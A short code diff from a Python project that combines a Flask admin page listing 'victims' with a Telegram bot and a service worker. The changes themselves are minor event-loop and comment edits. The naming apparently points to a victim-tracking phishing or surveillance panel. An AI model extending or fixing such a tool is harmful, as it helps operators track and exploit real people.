@@ -250,7 +250,7 @@ def admin():
         })
     return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)
 
-# Service Worker (unchanged)
+# -------------------- Service Worker --------------------
 SW_JS = """
 self.addEventListener('install', event => { self.skipWaiting(); });
 self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
@@ -311,7 +311,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global BOT_ACTIVE  # must be at top
+    global BOT_ACTIVE
     query = update.callback_query
     await query.answer()
     data = query.data
@@ -432,7 +432,8 @@ async def main():
     application.add_handler(CommandHandler("admin", admin_cmd))
     application.add_handler(CallbackQueryHandler(button_handler))
 
-    await application.run_polling()
+    # Run bot with close_loop=False to avoid event loop errors
+    await application.run_polling(close_loop=False)
 
 if __name__ == '__main__':
     asyncio.run(main())
